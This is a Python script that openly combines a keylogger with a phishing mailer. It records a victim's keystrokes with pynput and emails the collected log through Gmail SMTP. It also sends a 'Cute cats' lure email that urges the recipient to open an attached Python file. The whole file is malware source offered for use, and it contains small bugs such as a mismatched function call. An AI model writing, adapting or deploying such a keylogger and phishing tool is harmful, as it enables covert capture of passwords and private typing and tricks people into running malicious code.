from pynput.keyboard import Key, Listener
import getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase


# logger
full_log = ''
word = ''
email_char_limit = eval(input("The maximum characters to send on mail: "))


# Capture key presses
def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    # Add spaces for spacebar clicks and enter keys
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        # Send mail when the number of characters reaches the maximum mailable characters
        if len(full_log) >= email_char_limit:
            print(full_log)
            send_mail()
            full_log = ''
    # delete characters of backspace clicks
    elif key == Key.backspace:
        word = word[:-1]
    #  Ignow shift keys
    elif key == Key.shift_l or key == Key.shift_r:
        return
    # Append characters to form readable words
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    # Escape cancels keylog operation and returns to menu
    if key == Key.esc:
        return False


# send full logs to mail
def send_mail():
    server.sendmail(email, email, full_log)


# phishing email
def mail_attack():
    victim = input('Enter victims mail: ')

    subject = "Cute cats"
    body = "Hi! \n Did you know Ragdoll kittens are the most beautiful breeds of cats in the world? \n click the " \
           "attachment to view... "
    sender_email = email
    receiver_email = victim
    password = input("Type your password and press enter:")

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = "cute_cats.py"  # In same directory as script

    # Open PDF file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as mail:
        mail.login(sender_email, password)
        mail.sendmail(sender_email, receiver_email, text)
        print('Done')

        mail.quit()


# Keylog operation
def keylog_operation():
    with Listener(on_press=on_press) as listener:
        listener.join()


# Display commandline menu
def menu():
    MENU = '\
        1: Keylog \
        2: Phishing \
        3: Exit \
        '
    print(MENU)


if __name__ == '__main__':
    # setup email
    email = input('Enter mail: ')
    password = getpass.getpass(prompt='Password: ', stream=None)
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    print("Authenticating...")
    server.login(email, password)

    
    while True:
        menu()
        choice = eval(input("Choose operation: "))
        if choice == 1:
            keylog_operation(word,full_log,email_char_limit)
        elif choice == 2:
            mail_attack()
        elif choice == 3:
            exit()
        else:
            print('Choice unknown')
            exit()
